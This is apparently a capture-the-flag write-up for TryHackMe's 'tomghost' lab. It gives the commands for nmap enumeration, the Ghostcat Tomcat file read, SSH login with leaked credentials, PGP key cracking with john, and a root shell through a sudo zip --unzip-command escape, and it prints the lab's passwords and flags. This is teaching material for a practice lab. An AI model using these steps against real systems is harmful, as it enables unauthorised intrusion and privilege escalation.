### Tomghost CTF Writeup

## Introduction
This is a detailed writeup for the **tomghost** machine from TryHackMe. The objective was to obtain the user and root flags by exploiting an Apache Tomcat vulnerability and escalating privileges through misconfigured sudo permissions.

## Enumeration

##### Nmap Scan
The initial scan identified several open ports, including SSH, AJP, and HTTP (Tomcat).

```bash
nmap -sC -sV 10.48.158.16
```

**Results:**
- **Port 22:** OpenSSH 7.2p2
- **Port 8009:** AJP13 (Apache Jserv Protocol v1.3)
- **Port 8080:** Apache Tomcat 9.0.30

The presence of Apache Tomcat 9.0.30 on port 8009 suggested susceptibility to the **Ghostcat** (CVE-2020-1938) vulnerability.

## Exploitation

##### Ghostcat (CVE-2020-1938)
Ghostcat is a file read/inclusion vulnerability in the AJP connector. Using a Python exploit script, I was able to read internal files from the Tomcat web application.

Using Metasploit module:`auxiliary/admin/http/tomcat_ghostcat`

**Findings:**
The `web.xml` file contained a comment with credentials:
- **Username:** `skyfuck`
- **Password:** `8730281lkjlkjdqlksalks`

##### SSH Access - 
**User:`skyfuck`**
I logged into the machine via SSH using the discovered credentials.

```bash
ssh skyfuck@10.48.158.16
```

In `skyfuck`'s home directory, I found two interesting files:
- `credential.pgp`: An encrypted PGP file.
- `tryhackme.asc`: A PGP private key file.

## Post-Exploitation & Privilege Escalation

##### Cracking the PGP Key
The PGP private key was protected by a passphrase. I transferred the files to my local machine and used `gpg2john` and `john` to crack it.

```bash
gpg2john tryhackme.asc > tryhackme.hash
john --wordlist=rockyou.txt tryhackme.hash
```

**Cracked Passphrase:** `alexandru`

##### Decrypting Credentials
With the passphrase, I imported the key and decrypted `credential.pgp`.

```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

**Results:**
Found credentials for the user `merlin`:
- **Username:** `merlin`
- **Password:** `asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

##### User Flag
I switched to the `merlin` user via SSH and retrieved the user flag.

```bash
ssh merlin@10.48.158.16
cat user.txt
```
**User Flag:** `THM{GhostCat_1s_so_cr4sy}`

### Privilege Escalation to Root
I checked the sudo permissions for `merlin`.

```bash
sudo -l
```

**Results:**
`(root : root) NOPASSWD: /usr/bin/zip`

The `zip` binary can be exploited for privilege escalation using the `-T` (test) flag and `--unzip-command`.

```bash
sudo zip /tmp/tmp.zip /etc/hosts -T --unzip-command='sh -c "cat /root/root.txt"'
```
OR
```
sudo zip /tmp/exploit999.zip /etc/hosts -T --unzip-command="sh -c /bin/bash"
```

**Root Flag:** `THM{Z1P_1S_FAKE}`

## Conclusion
The machine was compromised by exploiting the Ghostcat vulnerability in an outdated version of Apache Tomcat. Privilege escalation was achieved by cracking a PGP private key to gain access to another user and then exploiting a `NOPASSWD` sudo entry for the `zip` utility.
